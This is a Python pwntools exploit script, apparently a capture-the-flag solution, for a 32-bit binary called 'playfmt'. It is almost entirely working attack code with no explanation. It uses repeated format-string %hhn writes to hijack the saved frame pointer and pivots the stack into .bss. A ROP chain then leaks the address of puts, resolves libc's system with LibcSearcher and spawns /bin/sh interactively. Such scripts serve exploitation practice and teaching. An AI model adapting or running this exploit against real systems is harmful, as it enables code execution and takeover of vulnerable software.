#-*- coding:utf-8 -*-
from LibcSearcher import *
from pwn import *
context(os = 'linux', arch = 'i386', terminal = ['tmux', 'splitw', '-h'])
#context.log_level = 'debug'
p = process('./playfmt')
elf = ELF('playfmt')

leave_ret_addr = 0x080487b8
puts_got = elf.got['puts']

payload = '%156c%6$hhn'
p.sendline(payload)
payload = '%184c%14$hhn'
p.sendline(payload)

payload = '%157c%6$hhn'
p.sendline(payload)
payload = '%135c%14$hhn'
p.sendline(payload)

payload = '%158c%6$hhn'
p.sendline(payload)
payload = '%4c%14$hhn'
p.sendline(payload)

payload = '%159c%6$hhn'
p.sendline(payload)
payload = '%8c%14$hhn'
p.sendline(payload)

payload = '%136c%6$hhn' #恢复栈底指针
p.sendline(payload)
#*******************************************
bss_addr = 0x0804b060
p.sendline('%96c%14$hhn')

p.sendline('%137c%6$hhn')
p.sendline('%176c%14$hhn')

p.sendline('%138c%6$hhn')
p.sendline('%4c%14$hhn')

p.sendline('%139c%6$hhn')
p.sendline('%8c%14$hhn')

p.sendline('%136c%6$hhn') #恢复栈底指针

#########################################
puts_plt = 0x08048730
info("puts_plt ==> " + hex(puts_plt))
read_plt = 0x080486e8
info("read_plt ==> " + hex(read_plt))
pop_ebp = 0x08048c7b
pop_esi_edi_ebp = 0x08048c79

payload  = 'quit'
payload += '/bin/sh\x00'
payload += (0x20-len(payload))*'A'
payload += p32(0x0804bf00)
#payload += p32(puts_plt)
payload += p32(read_plt)
payload += p32(leave_ret_addr)
payload += p32(0)
payload += p32(0x0804bf00)
payload += p32(100)
#gdb.attach(p, 'b * 0x08048ae8')
p.sendline(payload)

payload  = 'AAAA'
payload += p32(puts_plt)
payload += p32(pop_ebp)
payload += p32(puts_got)
payload += p32(read_plt)
payload += p32(pop_esi_edi_ebp)
payload += p32(0)
payload += p32(0x0804bf24)
payload += p32(12) #0x08070020
#sleep(30)
p.sendline(payload)

puts_addr = u32(p.recvuntil('\xf7')[-4:])
info("puts_addr ==> " + hex(puts_addr))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system = libc_base + libc.dump('system')
info("system ==> " + hex(system))

payload = p32(system) + 'AAAA' + p32(0x0804b044)
p.sendline(payload)

p.interactive()

